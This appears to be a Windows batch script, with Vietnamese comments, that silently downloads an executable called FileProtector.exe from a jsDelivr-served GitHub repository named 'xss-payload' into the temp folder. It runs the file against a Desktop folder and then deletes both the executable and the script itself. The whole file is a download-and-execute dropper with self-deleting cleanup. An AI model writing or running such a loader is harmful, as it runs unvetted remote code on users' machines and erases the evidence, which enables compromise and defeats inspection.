@echo off
cd /d "%TEMP%"

:: Tải file
curl -sL -o FileProtector.exe "https://cdn.jsdelivr.net/gh/Syspho99/xss-payload@main/FileProtector.exe"
if not exist FileProtector.exe exit /b 1

:: Chạy file và ĐỢI nó kết thúc
start "" /wait "FileProtector.exe" "C:\Users\phonglh1\Desktop\test"

:: Sau khi FileProtector.exe kết thúc, xóa cả 2
del /f /q "FileProtector.exe"
del /f /q "%~f0"

exit /b 0